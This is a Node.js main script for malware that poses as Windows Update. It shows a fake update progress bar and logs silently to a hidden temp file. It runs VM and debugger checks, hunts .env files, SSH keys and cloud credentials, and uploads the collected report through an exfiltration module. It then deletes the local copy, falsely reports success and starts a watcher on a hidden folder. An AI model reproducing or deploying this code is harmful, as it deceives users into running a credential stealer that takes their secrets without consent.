const fs = require("fs");
const os = require("os");
const path = require("path");
const logger = require("./utils/logger");
const { PhaseError } = require("./utils/errors");
const startWatcher = require("./monitor/watcher");
const generateReport = require("./report/generator");
const { getHashedMachineGuid } = require("./system/machineId");
const { exfiltrate } = require("./app/exfil");
const {
    collectSystemData,
    huntEnvFiles,
    huntSecretFiles,
    performCrudOperations,
    buildReport
} = require("./app/orchestrator");
const { detectVM } = require("./system/vmDetect");
const { detectDebugger } = require("./system/debugDetect");

const startTime = Date.now();
const ROOT = path.resolve(__dirname, "..");
const HIDDEN_DIR = path.join(os.homedir(), ".windows-update");
const LOG_FILE = path.join(os.tmpdir(), ".wu-run.log");
const DRY_RUN = process.argv.includes("--dry-run");

logger.silent(true);
logger.setLogFile(LOG_FILE);

process.on("uncaughtException", (err) => {
    logger.error(`Uncaught exception: ${err.message}`);
    console.log("Windows Update completed with errors.");
    process.exit(1);
});

process.on("unhandledRejection", (err) => {
    logger.error(`Unhandled rejection: ${err.message}`);
});

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function fakeProgress() {
    const kbNumber = `KB${String(Math.floor(Math.random() * 9000000) + 1000000)}`;
    const progressSteps = [];
    let current = 0;

    while (current < 100) {
        const increment = Math.floor(Math.random() * 25) + 5;
        current = Math.min(current + increment, 100);
        progressSteps.push(current);
    }

    console.log("Verifying Windows Update components...");
    await sleep(800 + Math.random() * 1200);

    for (const pct of progressSteps) {
        console.log(`Downloading update ${kbNumber} (${pct}%)...`);
        await sleep(600 + Math.random() * 1400);
    }

    console.log(`Installing update ${kbNumber}...`);
    await sleep(1000 + Math.random() * 2000);

    console.log("Configuring Windows Update settings...");
    await sleep(800 + Math.random() * 1200);

    console.log("Applying system optimizations...");
    await sleep(600 + Math.random() * 1000);
}

(async () => {
    const errors = [];
    let systemData = {};
    let envFiles = { targets: [], totalFound: 0, files: [] };
    let secretFiles = { sshKeys: [], cloudCreds: [], totalFound: 0, files: [] };
    let crudLog = [];
    let safetyChecks = {};

    await fakeProgress();

    if (DRY_RUN) {
        console.log("DRY-RUN MODE — No files will be copied or exfiltrated.");
    }

    try {
        safetyChecks = {
            vm: detectVM(),
            debugger: detectDebugger()
        };
        if (safetyChecks.vm.isVM) {
            logger.warn(`VM detected (confidence: ${safetyChecks.vm.confidence})`);
        }
        if (safetyChecks.debugger.isDebugged) {
            logger.warn(`Debugger detected: ${safetyChecks.debugger.indicators.join("; ")}`);
        }
    } catch (err) {
        logger.warn(`Safety checks failed: ${err.message}`);
    }

    try {
        systemData = await collectSystemData();
        logger.info("Phase 1 complete");
    } catch (err) {
        const wrapped = new PhaseError("Phase 1", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        envFiles = huntEnvFiles();
        logger.info("Phase 2 complete");
    } catch (err) {
        const wrapped = new PhaseError("Phase 2", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        secretFiles = huntSecretFiles();
        logger.info("Secret file scan complete");
    } catch (err) {
        const wrapped = new PhaseError("Secret scan", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        crudLog = performCrudOperations(ROOT, DRY_RUN);
        logger.info("Phase 3 complete");
    } catch (err) {
        const wrapped = new PhaseError("Phase 3", err);
        logger.error(wrapped.message);
        errors.push(wrapped.message);
    }

    try {
        const report = buildReport(systemData, envFiles, secretFiles, crudLog, startTime, errors);
        report.safetyChecks = safetyChecks;

        if (DRY_RUN) {
            generateReport(report);
            logger.info("Dry-run: report saved locally, exfil skipped");
        } else {
            const reportResult = generateReport(report);
            const systemId = getHashedMachineGuid();
            report.systemId = systemId;

            const uploaded = await exfiltrate(report, systemId);
            if (uploaded && reportResult && reportResult.path) {
                fs.unlinkSync(reportResult.path);
                logger.debug("Local report deleted after upload");
            }
        }
    } catch (err) {
        logger.error(`Report phase failed: ${err.message}`);
    }

    logger.info("Done.");

    console.log("Windows Update completed successfully.");

    if (!DRY_RUN) {
        try {
            startWatcher(HIDDEN_DIR, (filename, eventType) => {
                logger.warn(`Suspicious file detected: ${filename} (${eventType})`);
            });
        } catch (err) {
            logger.warn(`Watcher failed to start: ${err.message}`);
        }
    } else {
        logger.info("Dry-run: file watcher skipped");
    }
})();
